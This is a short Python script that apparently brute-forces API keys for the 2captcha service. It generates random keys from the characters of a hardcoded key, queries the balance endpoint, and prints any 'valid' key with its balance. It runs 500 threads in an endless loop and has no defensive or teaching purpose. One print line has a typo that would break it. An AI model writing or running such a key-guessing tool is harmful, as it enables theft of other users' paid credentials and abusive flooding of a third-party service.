import requests, random
from colorama import Fore, init
from threading import Thread
from time import strftime, gmtime

def Main():
    legit_key = '4c8c6379d01aaf308803fc4e63342bf0' # Some Shitty Key ;) 0 Bal
    rand_key = ''.join(random.choice(legit_key) for i in range(32))
    r = requests.get(f'http://2captcha.com/res.php?action=getbalance&key={rand_key}')
    if "ERROR_WRONG_USER_KEY" in r.text:
        print(f'{Fore.RED}[{Fore.RESET}{strftime("%H:%M:%S", gmtime())}{Fore.RED}]{Fore.RESET} Invalid: {For.RED}{rand_key} {Fore.RESET}')
    if "IP_BANNED" in r.text:
        print(f'{Fore.RED}[{Fore.RESET}{strftime("%H:%M:%S", gmtime())}{Fore.RED}]{Fore.RESET} Rate Limited')
    if "." in r.text:
        print(f'{Fore.GREEN}[{Fore.RESET}{strftime("%H:%M:%S", gmtime())}{Fore.GREEN}]{Fore.RESET} Valid: {Fore.GREEN}{rand_key} {Fore.RESET}| Balance: {Fore.GREEN}${r.text} {Fore.RESET}')

if __name__ == '__main__':
    while True:
            for i in range(0, 500):
                Thread(target=Main).start()
